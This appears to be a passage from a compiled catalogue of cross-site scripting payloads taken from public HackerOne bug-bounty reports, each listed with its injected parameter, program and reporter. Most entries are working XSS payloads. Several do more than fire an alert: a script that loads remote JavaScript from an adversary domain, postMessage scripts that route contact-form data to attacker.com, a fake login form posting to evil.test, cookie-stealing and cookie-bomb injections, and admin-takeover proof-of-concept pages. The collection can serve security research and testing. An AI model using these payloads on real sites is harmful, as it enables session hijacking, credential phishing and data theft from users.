Content-Type: multipart/form-data; boundary=---------------------------392581797716153644644274802600
Origin: https://target.com
Content-Length: 1156
DNT: 1
Co
```

**Parameter:** `message[content]`
— [stored XSS in target.com message content](https://hackerone.com/reports/988272) · Basecamp · [carbon61](https://hackerone.com/carbon61)


## Stored XSS using minimal SVG with onload attribute

### `f8f8e09c`

```
<svg onload="">
```

— [Stored XSS via SVG Upload — check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)](https://hackerone.com/reports/3606773) · phpBB · [a7mmr](https://hackerone.com/a7mmr)


## Stored XSS using multiple `<img onerror>` tags that set large cookies (cookie‑bomb) in a GTM page

### `86afb137`

```
<html>
 <img src=x onerror="document.cookie='x1='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.target.com'">
<img src=x onerror="document.cookie='x2='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.target.com'">
<img src=x onerror="document.cookie='x3='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.target.com'">
<img src=x onerror="document.cookie='x4='+Array(3900).join(0)+';Expires=Wed, 02 Apr 
```

— [XSS in target.com can compromise data of evil.com](https://hackerone.com/reports/862882) · Reddit · [keer0k](https://hackerone.com/keer0k)


## Stored XSS via onclick attribute injection in an anchor element

### `1ad3f2ea`

```
<a href="#" onclick="AddFriend(false,'PROFILE_NUMBER','NAME'); alert(document.cookie+''); $J(this).hide(); return false;" class="btnv6_blue_hoverfade btn_small btn_uppercase" style="display: none;">
    <span>Add as friend</span>
</a>
```

— [Stored XXS @ https://target.com/search/users/#text= via Profile Name](https://hackerone.com/reports/351171) · Valve · [osintopsec](https://hackerone.com/osintopsec) · $750.0


## Stored XSS payload delivering malicious HTML/JS that escalates privileges via API calls

### `f515a039`

```
<html>
<head>
  <title>PoC - Dust Workspace Takeover</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 40px;
      background-color: #f8f9fa;
    }
    .container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
    }
    h1 {
      color: #333;
    }
    p {
      color: #555;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1>Proof of Concept - Dust Workspace Admin Takeover</
```

— [Stored XSS in File Upload Leads to Privilege Escalation and Full Workspace Takeover](https://hackerone.com/reports/3115705) · Dust · [sjalu](https://hackerone.com/sjalu)


## Stored XSS payload using an <img> onload alert injected into email content

### `85f3c429`

```
<img Src="http://target.com/JPx2sV" onload=alert("PENTEST")>%20%20> "<iframe Src=a>%20<iframe>
```

— [Persistent input validation mail encoding vulnerability  in the "just followed you" email notification.](https://hackerone.com/reports/114879) · Eternal · [pr0tagon1st](https://hackerone.com/pr0tagon1st)


## Stored XSS payload with malformed HTML/iframe tags injected into email content

### `054fb83d`

```
"><"<img src="x">%20%20> "<iframe src=a>%20<iframe>
```

— [Persistent input validation mail encoding vulnerability  in the "just followed you" email notification.](https://hackerone.com/reports/114879) · Eternal · [pr0tagon1st](https://hackerone.com/pr0tagon1st)


## Stored XSS in product description field using an <img> tag with onerror=prompt()

### `7792093d`

```
> <img src=x onerror=prompt(document.domain)>
```

**Parameter:** `description`
— [\[h1-2102\] Stored XSS in product description via `productUpdate` GraphQL query leads to XSS at target.com/products/\[ID\]](https://hackerone.com/reports/1085546) · Shopify · [intidc](https://hackerone.com/intidc) · $1,600.0


## Stored XSS via project name containing <script src="http://.../payload.js"></script>

### `7b786962`

```
<script src="http://<adversery_domain>/payload.js"></script>
```

**Parameter:** `project name`
— [Stored XSS @ /engage/<project_slug>](https://hackerone.com/reports/472391) · Weblate · [lgian](https://hackerone.com/lgian)


## Stored XSS via a raw <img> tag with onerror attribute in a map marker title after entity decoding

### `bc83870f`

```
<img src=x onerror=alert(1) "
```

**Parameter:** `title`
— [Stored Cross-Site Scripting in Map Share Page](https://hackerone.com/reports/65284) · Mapbox · [hussain_0x3c](https://hackerone.com/hussain_0x3c)


## Stored XSS via React element injection using dangerouslySetInnerHTML

### `e7096fb2`

```
$.ajax({ 
  url: "https://target.com/reports/bulk", 
  method: 'post', 
  contentType: "application/json", 
  data: JSON.stringify({ 
    state: "open", 
    substate: "triaged", 
    report_ids: [… id of the report …], 
    reply_action: "change-state", 
    reference: {
      _isReactElement: true,
      _store: {},
      type:"body",
      props: {
        dangerouslySetInnerHTML: {
          __html:
            "<h1>Arbitrary HTML</h1><script>alert('No CSP Support :(')</script>"
        }
```

**Parameter:** `reference`
— [Improperly validated fields allows injection of arbitrary HTML via spoofed React objects](https://hackerone.com/reports/49652) · HackerOne · [danlec](https://hackerone.com/danlec) · $5,000.0


## Stored XSS via the same `javascript:` payload in the `referer` parameter, triggered when the link is clicked

### `c141e203`

```
https://target.com/student/award/████████?referer=javascript:alert(document.domain)
```

**Parameter:** `referer`
— [XSS via referrer parameter](https://hackerone.com/reports/867616) · X / xAI · [keer0k](https://hackerone.com/keer0k)


## Stored XSS via <script> that opens admin page and uses postMessage to navigate to a malicious page

### `04fd5893`

```
<script>
    function attack(){
        const ctx = window.open(location.origin+'/admin/themes', '_blank')
        const data = JSON.stringify({
            message: 'Shopify.API.pushState',
            data: {pathname: "/../pages/xss"}
        });

        let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                ctx.postMessage(data)
            }
        }, 500)
    }
    attack
```

— [Inject page in admin panel via Shopify.API.pushState](https://hackerone.com/reports/662083) · Shopify · [tiago-danin](https://hackerone.com/tiago-danin) · $500.0


## Stored XSS via serialized PHP option containing <script>alert('test')</script>

### `fc2f60ff`

```
a:1:{s:34:"<script>alert('test')</script>test";a:1:{s:7:"expires";i:1893456000;}}
```

— [XSS Vulnerability on Pressable/Atomic Hosting Platform via unescaped admin notices leads to code execution](https://hackerone.com/reports/3447021) · Automattic · [georgestephanis](https://hackerone.com/georgestephanis)


## Stored XSS via shop name field injection

### `4fc94313`

```
lll"></script><script>alert('xss');</script>
```

— [Stored xss in shop name @ target.com](https://hackerone.com/reports/329862) · target.com · [sandeep_hodkasia](https://hackerone.com/sandeep_hodkasia)


## Stored XSS using a specially crafted string 'XSS[JavaScript:alert(1)]' that executes when rendered

### `01e4980f`

```
XSS[JaVaScriPt:alert(1)] <-- click to test
```

— [\[RDoc\] XSS in project README files](https://hackerone.com/reports/200693) · GitLab · [ysx](https://hackerone.com/ysx)


## Stored XSS by supplying a `javascript:` URL in the `referer` query parameter, which is later rendered as a link

### `9503a2cf`

```
https://target.com/student/award/███?referer=javascript:alert(document.domain)
```

**Parameter:** `referer`
— [XSS via referrer parameter](https://hackerone.com/reports/867616) · X / xAI · [keer0k](https://hackerone.com/keer0k)


## Stored XSS by supplying a malicious Less plugin that executes JavaScript when loaded

### `21dd2cc0`

```
confirm("XSS Less plugin");
module.exports = {
  install: function(less, pluginManager, functions) {
    functions.add('xss', function(val) {
      return val.value;
    });
  }
};
```

— [Stored XSS in TSVB Visualizations Markdown Panel](https://hackerone.com/reports/858874) · Elastic · [jeremybuis](https://hackerone.com/jeremybuis)


## Stored XSS in an SVG file using the `alert(XSS)` JavaScript payload

### `28b0df08`

```
alert(XSS)
```

— [Arbitrary file upload and stored XSS via ███ support request](https://hackerone.com/reports/865354) · U.S. Dept Of Defense · [z32](https://hackerone.com/z32)


## Stored XSS via SVG <script> payload in hidden form field

### `7cbd6cf6`

```
<input type="hidden" name="loopState&#91;moduleId&#93;" value="&lt;svg&gt;&lt;script&gt;prompt&amp;&#35;40&#59;document&#46;domain&#41;&lt;&#47;script&gt;" />
```

**Parameter:** `loopState[moduleId]`
— [\[Zomato's Blog\] POST based XSS on https://target.com/blog/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=8.2](https://hackerone.com/reports/335481) · Eternal · [inferno-](https://hackerone.com/inferno-) · $100.0


## Stored XSS in a Swagger/OpenAPI JSON description field containing a <script>alert(0)</script> tag

### `c829d276`

```
{
  "swagger" : "2.0",
  "info" : {
    "description" : "<a href=https://target.com/yvvdwf/data/-/wikis/evil.com data-type=script style='cursor:default' data-remote=true class='atwho-view select2-drop-mask pika-select'></a><script>alert(0)</script>"
  }}
```

— [Stored XSS in blob viewer](https://hackerone.com/reports/806571) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Stored XSS in Trix editor by injecting a malicious <img> tag via data-trix-attachment content

### `36861219`

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Trix Editor XSS Demo</title>
  <script src="https://target.com/npm/trix@2.1.1/dist/trix.umd.min.js"></script>
  <link href="https://target.com/npm/trix@2.1.1/dist/trix.min.css" rel="stylesheet">
</head>
<body>
  <h1>Trix Editor XSS Demo</h1>
  <trix-editor></trix-editor>
  <script>
  document.write(`copy<div data-trix-attachment="{&quot;contentType&quot;:&quot;text/html5&quot;,&quot;content&quot;:&quot;&lt;img 
```

— [Stored XSS on trix editor version 2.1.1](https://hackerone.com/reports/2521419) · Basecamp · [thwin_htet](https://hackerone.com/thwin_htet) · $1,000.0


## Stored XSS via unescaped JSON field injected into an HTML attribute (onerror)

### `a787b5b0`

```
{
        "type": "image",
        "image": "xss",
        "description": "descr' onerror='alert(/XSS by skavans/)",
        "image_width": 1,
        "image_height": 1
}
```

**Parameter:** `description`
— [Stored XSS in posts because of absence of oembed variables values escaping](https://hackerone.com/reports/197914) · Discourse · [skavans](https://hackerone.com/skavans)


## Stored XSS via uploaded HTML file containing <script>alert(...)</script>

### `ac92311b`

```
<html><script>alert(document.domain)</script></html>
```

— [Stored XSS in WordPress](https://hackerone.com/reports/276105) · WordPress · [abdullah](https://hackerone.com/abdullah)


## Stored XSS via uploaded JavaScript file executing alert with parent URL

### `bf482449`

```
alert('Hello: ' + window.parent.location.href);
```

— [XSS on Issue reference numbers](https://hackerone.com/reports/831962) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Stored XSS via uploaded SVG containing a <script> tag

### `3406da01`

```
<svg><!--?php "--><script>confirm(20)</script>?&gt;</svg>
```

— [Bypass Filter and get Stored Xss ](https://hackerone.com/reports/299424) · Shopify · [dr_dragon](https://hackerone.com/dr_dragon) · $3,000.0


## Stored XSS via URL‑encoded SVG onload injection in the request path

### `1cc5232b`

```
http://127.0.0.1:6060/%22%3E%3Csvg%20onload=alert(5);%3E/
```

— [\[html-pages\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/330356) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)


## SVG-based XSS with an embedded <script> tag

### `6606b6b9`

```
<svg xmlns="http://target.com/2000/svg" viewBox="0 0 96 105">
<html><head><title>test</title></head><body><script>alert('xss');</script></body></html>
</svg>
```

— [SVG file that HTML Included is able to upload via File Manager](https://hackerone.com/reports/437863) · Concrete CMS · [hexife](https://hackerone.com/hexife)


## SVG‑based XSS by embedding malicious HTML inside a foreignObject

### `6dcc52d4`

```
<svg width="256" height="128" version="1.1" viewBox="0 0 256 128" xmlns="http://target.com/2000/svg"><g fill="none" stroke-width="22"><circle cx="40" cy="64" r="26" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://target.com/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle al
```

— [Reflected XSS / Markup Injection in `index.php/svg/core/logo/logo` parameter `color`](https://hackerone.com/reports/605915) · Nextcloud · [freddyb](https://hackerone.com/freddyb)


## SVG file with onload JavaScript execution (stored XSS via file upload)

### `42d158ea`

```
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns='http://target.com/2000/svg' width="200px" height="200px" onload="javascript:alert(location)">
</svg>
```

**Parameter:** `image`
— [XSS by file (Active Storage `Proxying`)](https://hackerone.com/reports/949513) · Ruby on Rails · [ooooooo_q](https://hackerone.com/ooooooo_q) · $500.0


## SVG file upload XSS using an onload attribute

### `94f007ff`

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [
    <!ENTITY elem "">
]>
<svg onload="alert(document.domain);" height="16" width="16">
  &elem;
</svg>
```

— [XSS on $shop$.target.com/admin/ and evil.com via whitelist bypass in SVG icon for sales channel applications](https://hackerone.com/reports/232174) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $5,000.0


## SVG onload attribute XSS on line element

### `5c132eb1`

```
<line onload="alert(2)" fill="none" stroke="#000000" stroke-miterlimit="10" x1="119" y1="84.5" x2="454" y2="84.5"/>
```

— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0


## SVG onload JavaScript execution (XSS)

### `0a7eec4d`

```
<svg ... onload="alert('SIKN')">...</svg>
```

— [XSS on using the legacy "Graphie To Png" API](https://hackerone.com/reports/2846011) · Khan Academy · [sikn](https://hackerone.com/sikn)


## SVG onload JavaScript injection via msg parameter

### `18b387d2`

```
<svg/onload=alert("XSS") >
```

**Parameter:** `msg`
— [XSS in GOCD Analytics Plugin](https://hackerone.com/reports/2433634) · GoCD · [aviv_keller](https://hackerone.com/aviv_keller)


## SVG onload XSS via form field injection

### `e9738342`

```
<form action=█████████/WaterControl/shefgraph-historic.cfm?sid=BL110 method=POST><input type=hidden name="fld_graphrslow" value="Y"><input type=hidden name="fld_graphrslow" value="N"><input type=hidden name="Submit" value="View Graph"><input type=hidden name="fld_from1" value="01/01/2020"><input type=hidden name="fld_to1" value="12/31/2020"><input type=hidden name="fld_displaytype" value="S"><input type=hidden name="fld_type1" value="Plot"><input type=hidden name="fld_frompor" value="1&quot;&lt;
```

**Parameter:** `fld_frompor`
— [XSS Reflect to POST █████](https://hackerone.com/reports/1003433) · U.S. Dept Of Defense · [ofjaaaah](https://hackerone.com/ofjaaaah)


## SVG onload XSS (JavaScript execution via the onload attribute)

### `6d6e3c33`

```
<svg version="1.0" xmlns="http://target.com/2000/svg"
 width="2560.000000pt" height="1600.000000pt" viewBox="0 0 2560.000000 1600.000000"
 preserveAspectRatio="xMidYMid meet" onload="alert(document.cookie)">
```

— [Stored XSS on upload files leads to steal cookie](https://hackerone.com/reports/765679) · Palo Alto Software · [homai](https://hackerone.com/homai)


## SVG payload using an <image> tag with onerror attribute to run JavaScript

### `bc0a97fe`

```
<svg id='x' xmlns='http://target.com/2000/svg' xmlns:xlink='http://target.com/1999/xlink' width='1337' height='1337'>
<image href="1" onerror="alert(window.origin)" />
</svg>
```

— [Rails ActionView sanitize helper bypass leading to XSS using SVG tag.](https://hackerone.com/reports/1805873) · Internet Bug Bounty · [haqpl](https://hackerone.com/haqpl) · $2,400.0


## SVG script XSS (alert executed on load)

### `d9ffa45e`

```
alert('script')
```

— [Executing scripts on target.com using SVG](https://hackerone.com/reports/100565) · Slack · [kamil_hism](https://hackerone.com/kamil_hism)


## SVG with <style> containing <script> XSS (style tag injection)

### `62ed5666`

```
<svg><style><script>alert(1)</script></style></svg>
```

— [Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)](https://hackerone.com/reports/1656627) · Ruby on Rails · [0b5cur17y](https://hackerone.com/0b5cur17y)


## SVG <svg onload> attribute XSS payload

### `076f56fc`

```
<svg onload>
```

— [Stored XSS via SVG Upload — check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)](https://hackerone.com/reports/3606773) · phpBB · [a7mmr](https://hackerone.com/a7mmr)


## SVG tag injection bypassing sanitization leading to XSS

### `341716f2`

```
<svg>
```

— [XSS on Issue reference numbers](https://hackerone.com/reports/831962) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Template injection leading to stored XSS by embedding `alert(1)` in a branch name placeholder

### `d6bfe4af`

```
%(branch)s:alert(1);//https://
```

— [Self-XSS can be achieved in the editor link using filter bypass](https://hackerone.com/reports/229735) · Weblate · [sp1d3rs](https://hackerone.com/sp1d3rs)


## URL‑encoded attribute injection via path parameter

### `bc050eff`

```
https://target.com/shop/paymentmethod/hkjhk%2522onclick=%2522confirm(/-/g+this.ownerDocument.domain
```

**Parameter:** `path`
— [Reflected XSS on https://target.com/shop/paymentmethod/ (bypass for 227486)](https://hackerone.com/reports/252908) · Starbucks · [bayotop](https://hackerone.com/bayotop)


## XML‑RPC XSS payload injected in request body

### `e98f5695`

```
<member><name>file</name><value>ccc'&gt;test&lt;img src=x onerror=alert('xss') onload=alert('xss')&gt;</value></member>
```

— [WordPress core stored XSS via attachment file name](https://hackerone.com/reports/139245) · Automattic · [jouko](https://hackerone.com/jouko)


## XSS via attribute injection in a <link> tag (accesskey/onClick)

### `309bdc36`

```
<link rel="canonical" href="https://target.com/htp8bi2zcg" accesskey="x" onclick="confirm`1`" 2injectiontrme47nbfq="" blonde="" bright-sky-blend="" ground="1&quot;">
```

— [Reflected cross-site scripting on multiple Starbucks assets.](https://hackerone.com/reports/629745) · Starbucks · [stealthy](https://hackerone.com/stealthy)


## XSS via attribute injection in the "p" query parameter of a markdown link

### `14ef47a1`

```
[ ](http://a?p=[[/onclick=alert(0) .]])
```

**Parameter:** `p`
— [Markdown parsing issue enables insertion of malicious tags](https://hackerone.com/reports/758002) · Phabricator · [sectex](https://hackerone.com/sectex)


## XSS by breaking out of a hidden input tag and injecting <script>alert(document.cookie)</script>

### `30de77df`

```
<input type="hidden" name="first&#95;name" value="test";</script><script>alert(document.cookie)</script>" />
```

**Parameter:** `first_name`
— [Self XSS + CSRF Leads to Reflected XSS in https://████/ ](https://hackerone.com/reports/1109544) · U.S. Dept Of Defense · [sleepnotf0und](https://hackerone.com/sleepnotf0und)


## XSS bypass using malformed <<!<script> tag to execute JavaScript

### `ac292bc4`

```
<<!<script>iframe src=javajavascriptscript:alert(document.domain)>
```

— [self-xss with ClickJacking can leads to account takeover in Firefox](https://hackerone.com/reports/892289) · Imgur · [keer0k](https://hackerone.com/keer0k)


## XSS via clipboard injection of a malformed script tag

### `9f501306`

```
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>PoC</title>
    <style media="screen">
      iframe{
        opacity: 50%;
        width: 1000px;
        height: 500px;

      }
      #content{
        position: relative;
      }
      #btn1{
        position:absolute;
        top: 30px;
        left: 170px;
        vertical-align: middle;
        padding: 0px;
        background-color: #7a297a;
        color:white;
        border: 2px solid #7a297a;
   
```

— [self-xss with ClickJacking can leads to account takeover in Firefox](https://hackerone.com/reports/892289) · Imgur · [keer0k](https://hackerone.com/keer0k)


## XSS via csv_file_name parameter containing malicious script in the filename

### `33e4a509`

```
sample-csv-sku.csv"-alert(document.domain)-"
```

**Parameter:** `price_list[csv_file_name]`
— [H1514 Stored XSS on Wholesale sales channel allows cross-organization data leakage](https://hackerone.com/reports/423454) · Shopify · [cablej](https://hackerone.com/cablej)


## XSS via Dailymotion embed parameter using SVG onload

### `e1cf34d4`

```
[dailymotion id=x8oma9"><svg/onload=prompt(document.domain)>]
```

**Parameter:** `media[11111111]`
— [Stored XSS on https://target.com/surveys/\[Survey-Id\]/question - Bypass](https://hackerone.com/reports/974271) · Automattic · [ali](https://hackerone.com/ali)


## XSS via image tag src injection with malicious query parameter

### `9745fbcf`

```
<img src=http://target.com?q={HTML}>
```

— [Stored XSS in messages](https://hackerone.com/reports/1669764) · SideFX · [itriedallthenamess](https://hackerone.com/itriedallthenamess) · $500.0


## XSS via <img> onerror attribute to open malicious site

### `38b8b416`

```
<img src=x onerror='javascript:window.open("http://target.com")'></img>
```

— [Stored XSS via Comment Form at ████████](https://hackerone.com/reports/915073) · U.S. Dept Of Defense · [z32](https://hackerone.com/z32)


## XSS via img onerror in Home Body configuration

### `a0a97f3e`

```
<img src=0 onerror="alert(0)"/>
```

**Parameter:** `home_body`
— [XSS (leads to arbitrary file read in Rocket.Chat-Desktop)](https://hackerone.com/reports/724153) · Rocket.Chat · [sectex](https://hackerone.com/sectex)


## XSS via img onerror JavaScript injection

### `5291f33a`

```
[{\"type\":\"h1\",\"text\":\"asd>\\\"'<img src=a onerror=alert(document.domain)>\"}]
```

**Parameter:** `content`
— [Stored XSS in content when Graph is created via API](https://hackerone.com/reports/287562) · Infogram · [krankopwnz](https://hackerone.com/krankopwnz)


## XSS using img tag break‑out and iframe onload

### `938e3da0`

```
<img src=a >\"><iframe onload=alert('XSS')>
```

— [XSS in L.mapbox.shareControl in mapbox.js](https://hackerone.com/reports/99245) · Mapbox · [enderun07](https://hackerone.com/enderun07) · $1,000.0


## XSS via injected onerror event handler attribute

### `cdfcbd49`

```
onerror="alert(1)"
```

— [Stored XSS on Trix Editor version latest (2.1.16) - Sanitizer Bypass ](https://hackerone.com/reports/3581911) · Basecamp · [newbiefromcoma](https://hackerone.com/newbiefromcoma) · $337.0


## XSS via injection into redirect_uri parameter (SVG onload)

### `7317f6a5`

```
https://target.com/authorize/?redirect_uri=%27%3E%3Csvg%20onload=%27alert%28document.domain%29%27%3E
```

**Parameter:** `redirect_uri`
— [XSS on target.com/authorize](https://hackerone.com/reports/143220) · Mapbox · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## XSS via javascript: URI embedded in link syntax (x[...])

### `c6e52a6a`

```
x[javascript:alert(1)]
```

— [Stored XSS in RDoc hyperlinks through javascript scheme](https://hackerone.com/reports/1977258) · Ruby · [sighook](https://hackerone.com/sighook)


## XSS via a javascript: URI injected into the JSON 'url' field that is used as an iframe src

### `86e67bb8`

```
{
  "account": {
    "url": "https://target.com/@a"
  },
  "url": "javascript:top.document.body.innerHTML = \"hi your cookie is \" + document.cookie;//"
}
```

**Parameter:** `url`
— [XSS from Mastodon embeds](https://hackerone.com/reports/1887917) · IRCCloud · [lotsofloops](https://hackerone.com/lotsofloops) · $500.0


## XSS via javascript: URI injection placed directly in the URL

### `d7e71900`

```
<>javascript:alert(document.cookie);
```

— [Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.* / shop.starbucks.* / target.com)](https://hackerone.com/reports/196846) · Starbucks · [inhibitor181](https://hackerone.com/inhibitor181)


## XSS via javascript: URI used as filename

### `cb2f2734`

```
javascript:alert('You are pwned!')
```

— [\[simplehttpserver\] Stored XSS in file names leads to malicious JavaScript code execution when directory listing is output in HTML](https://hackerone.com/reports/309648) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)


## XSS via JSON postMessage injecting an <img> with onerror JavaScript

### `b03188c0`

```
win.postMessage(JSON.stringify({
                action: "replaceRoute",
                route: "voucher.multi-product-details",
                model: {
                    eligible: true,
                    sku: {
                        id: 0, longDescription: `
                            <img src=x onerror='alert(document.domain)'>`
                    }
                }
            }), "*");
```

— [Reflected XSS on target.com using postMessage from the opening window](https://hackerone.com/reports/900619) · PlayStation · [vakzz](https://hackerone.com/vakzz) · $1,000.0


## XSS via malformed markup that renders a <script> tag

### `736f0504`

```
\x[\<script>alert(1);</script>\]
```

— [XSS exploit of RDoc documentation generated by rdoc (CVE-2013-0256)](https://hackerone.com/reports/1977168) · Ruby · [sighook](https://hackerone.com/sighook)


## XSS via malicious HTML file served through a crafted filename

### `7c2fde43`

```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script type="text/javascript" src="http://target.com/poc.js"></script>
</body>

</html>
```

— [\[public\] Stored XSS in filenames in directory served by public](https://hackerone.com/reports/316346) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)


## XSS via malicious JSON key containing an <img onerror> tag

### `25f72612`

```
{"<img onerror=confirm('xss_poc_unexpectedbufferc0n') src/>":1}
```

— [\[██████\] Reflected XSS via Keycloak on ██████](https://hackerone.com/reports/2126954) · U.S. Dept Of Defense · [hackeronanywhere](https://hackerone.com/hackeronanywhere)


## XSS using mutated <svg> and <img onerror> payload

### `89bd5051`

```
<svg><style></style></svg>
<img src="0" onerror="alert(0)">
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## XSS via onerror attribute in <audio> tag

### `5ebeda7b`

```
<HTML xmlns: ><audio>
<audio src=wp onerror=alert(0X1)>
```

— [Tinymce 2.4.0](https://hackerone.com/reports/262230) · Shopify · [jelmer](https://hackerone.com/jelmer) · $2,000.0


## XSS payload injected in request body as <script>alert(1)</script>

### `56059ec1`

```
Prashanths-MacBook-Pro:~ prashanthvarma$ nc localhost 80
POST /lol.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Transfer-Encoding: chunked
Content-Length: 25

<script>alert(1)</script>HTTP/1.1 400 Bad Request
Date: Mon, 09 Jul 2018 06:08:22 GMT
Server: Apache/2.4.33 (Unix) PHP/7.1.17
Content-Length: 226
```

— [Improper handling of Chunked data request in sapi_apache2.c leads to Reflected XSS](https://hackerone.com/reports/409986) · Internet Bug Bounty · [cymtrick](https://hackerone.com/cymtrick) · $500.0


## XSS via PNG metadata (tEXt Comment) injection

### `5afc3b0b`

```
�PNG
�
IHDRdp�TtEXtSoftwareAdobe ImageReadyq�e<9tEXtComment"><script>alert(prompt('XSS BY ZEROX4'))</script>
                                                                                                    /-{IDATx���E��K��s�9xd$#���J� %IR$�(���s�9Ñ������evnv���>����q�;;;S�U������\.����=��=�ܿ��BCb����QHyԑEYՑ�s$s�T�:�x���8���إ�}2`���0P����@�(��j�(����D�J�d�%[�
```

— [XSS Stored via Upload avatar PNG \[HTML\] File in target.com](https://hackerone.com/reports/964550) · Shopify · [zerox4](https://hackerone.com/zerox4)


## XSS via postMessage injecting malicious HTML (<img onerror>) into the target page

### `4ad0a58e`

```
<!DOCTYPE html>
<html>

<body>
    <button onclick="start()">click me</button>
    <script>
        window.addEventListener("message", (msg) => {
            console.log("got message", msg);
            alert(msg.data);
        });

        async function start() {
            win = window.open("https://target.com/", "transact");
            await new Promise((resolve) => setTimeout(resolve, 5000));

            win.postMessage(JSON.stringify({
                action: "replaceRoute
```

— [Reflected XSS on target.com using postMessage from the opening window](https://hackerone.com/reports/900619) · PlayStation · [vakzz](https://hackerone.com/vakzz) · $1,000.0


## XSS script that registers an onmessage listener to capture data from Marketo

### `500ffb11`

```
<?
header("Access-Control-Allow-Origin: *");
?>
(function(){
	if(window.icanhazmsg) return
	window.icanhazmsg=true
	window.onmessage=function(a) {
		if(a.origin.indexOf('marketo') !== -1) return;
		console.log(a);
		alert("I HAVE YOUR DATA NOW\n" + a.data)
	}
})()
```

— [Stealing contact form data on target.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) · HackerOne · [fransrosen](https://hackerone.com/fransrosen)


## XSS script that repeatedly postMessage to a Marketo iframe to exfiltrate data

### `b555cd2f`

```
<?
header("Access-Control-Allow-Origin: *");
?>
(function(){
document.body.innerHTML='<a href="#" onclick="window.b=window.open(\'https://target.com/product/overview#contact\',\'b\',\'\')">Click me!</a>'

setInterval(function() {
try {
	b['frames'][0].postMessage('{"mktoRequest":{"ajaxParams":{"url":"https://attacker.com/jsonp2.php","dataType":"jsonp","method":"get"}}}', '*')
} catch(e){}
}, 1000);
})()
```

— [Stealing contact form data on target.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) · HackerOne · [fransrosen](https://hackerone.com/fransrosen)


## XSS script that uses postMessage to load an attacker‑controlled JSONP endpoint

### `79cb4c2f`

```
<script>
var run = false
var b
window.onmessage=function() {
	if(!run)
	x.postMessage('{"mktoRequest":{"ajaxParams":{"url":"https://attacker.com/jsonp.php","dataType":"jsonp","method":"get"}}}', '*')
	run = true
}
</script>
```

— [Stealing contact form data on target.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) · HackerOne · [fransrosen](https://hackerone.com/fransrosen)


## XSS via `siteBaseUrl` parameter using newline and `<script>` tag

### `a2c52f4f`

```
http://target.com/%0a<script
```

**Parameter:** `siteBaseUrl`
— [Reflected XSS in target.com /searchasyoutype/v1/search?x-api-key=](https://hackerone.com/reports/213190) · Starbucks · [an0n-j](https://hackerone.com/an0n-j)


## XSS using <style> tag to embed <img onerror> payload

### `eebd4131`

```
<style><img/src="0"onerror="alert(0)"></style>
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## XSS via SVG animate element with javascript: URL

### `c52f86cb`

```
<div id="137"><svg>
<a xmlns:xlink="http://target.com/1999/xlink" xlink:href="?">
<circle r="400"></circle>
<animate attributeName="xlink:href" begin="0" from="javascript:alert(document.domain)" to="&" />
</a>//["'`-->]]>]</div>
```

— [\[target.com\] Stored XSS via Markdown SVG filter bypass](https://hackerone.com/reports/271007) · Automattic · [ysx](https://hackerone.com/ysx)


## XSS via SVG endpoint by injecting onload attribute in the color parameter

### `1f83dff5`

```
https://target.com/nextcloud/index.php/svg/core/logo/logo?color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1
```

**Parameter:** `color`
— [Reflected XSS / Markup Injection in `index.php/svg/core/logo/logo` parameter `color`](https://hackerone.com/reports/605915) · Nextcloud · [freddyb](https://hackerone.com/freddyb)


## XSS via SVG onload injection in title parameter

### `280299d7`

```
</title><svg/onload=alert(domain)>
```

**Parameter:** `title`
— [\[hta3\] Chain of ESI Injection & Reflected XSS leading to Account Takeover on \[███\]](https://hackerone.com/reports/1073780) · U.S. Dept Of Defense · [jr0ch17](https://hackerone.com/jr0ch17)


